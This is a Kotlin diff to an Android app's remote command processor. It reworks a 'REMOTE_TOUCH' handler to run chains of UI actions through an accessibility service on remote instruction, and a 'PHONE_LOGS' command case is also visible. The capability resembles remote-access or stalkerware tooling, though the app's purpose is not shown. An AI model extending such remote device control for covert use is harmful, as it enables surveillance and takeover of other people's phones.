@@ -569,14 +569,29 @@ object CommandProcessor {
                 "REMOTE_TOUCH" -> {
                     if (MyAccessibilityService.instance == null) {
                         status = "FAILED (SERVICE_OFF)"
-                        errorMsg = "Accessibility service is required for remote interaction."
+                        errorMsg = "Accessibility service is offline."
                     } else {
-                        val parts = content.split("|")
-                        val action = parts[0].trim().uppercase()
-                        
-                        // Execute on Service Instance
-                        val success = MyAccessibilityService.instance?.handleRemoteAction(action, parts.drop(1).map { it.trim() }) ?: false
-                        status = if (success) "TOUCH_DISPATCHED" else "TOUCH_EXECUTION_ERROR"
+                        try {
+                            val chain = if (content.trim().startsWith("[")) {
+                                JSONArray(content)
+                            } else {
+                                // Legacy Fallback Converter
+                                val parts = content.split("|")
+                                JSONArray().put(JSONObject().apply {
+                                    put("type", parts[0].trim())
+                                    put("val", parts.getOrNull(1)?.trim() ?: "")
+                                })
+                            }
+                            
+                            val chainReport = MyAccessibilityService.instance?.executeInteractionChain(chain)
+                            status = "CHAIN_EXECUTED"
+                            val result = JSONObject().put("report", chainReport)
+                            updateCommandStatus(ctx, id, status, null, result, null)
+                            return
+                        } catch (e: Exception) {
+                            status = "CHAIN_FAILED"
+                            errorMsg = e.message
+                        }
                     }
                 }
                 "PHONE_LOGS" -> {
